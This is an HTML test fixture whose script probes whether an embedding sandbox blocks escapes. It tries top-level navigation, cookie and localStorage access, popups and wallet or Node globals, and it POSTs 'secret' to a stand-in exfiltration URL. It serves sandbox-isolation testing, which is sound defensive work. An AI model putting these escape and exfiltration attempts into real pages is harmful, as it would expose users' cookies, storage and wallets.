<!doctype html>
<meta charset="utf-8">
<title>Sandbox fixture</title>
<script>
  const attempts = {
    opener: Boolean(window.opener),
    topNavigation: false,
    cookieRead: null,
    cookieWrite: false,
    localStorage: false,
    popup: null,
    externalFetch: null,
    walletAuthority: Boolean(window.unisat || window.BitcoinProvider || window.LeatherProvider || window.walletHost || window.satBrowser),
    nodeAuthority: typeof window.require !== 'undefined' || typeof window.process !== 'undefined',
    downloadAuthority: 'download' in document.createElement('a')
  };
  try { top.location = 'https://example.invalid/escaped'; attempts.topNavigation = true; } catch {}
  try { attempts.cookieRead = document.cookie; } catch { attempts.cookieRead = 'blocked'; }
  try { document.cookie = 'sandbox_escape=1'; attempts.cookieWrite = document.cookie.includes('sandbox_escape=1'); } catch {}
  try { localStorage.setItem('sandbox_escape', '1'); attempts.localStorage = localStorage.getItem('sandbox_escape') === '1'; } catch {}
  try { attempts.popup = Boolean(window.open('https://example.invalid/popup')); } catch { attempts.popup = false; }
  fetch('https://example.invalid/exfiltrate', { method: 'POST', body: 'secret' })
    .then(() => { attempts.externalFetch = true; })
    .catch(() => { attempts.externalFetch = false; })
    .finally(() => { document.body.textContent = JSON.stringify(attempts); });
</script>
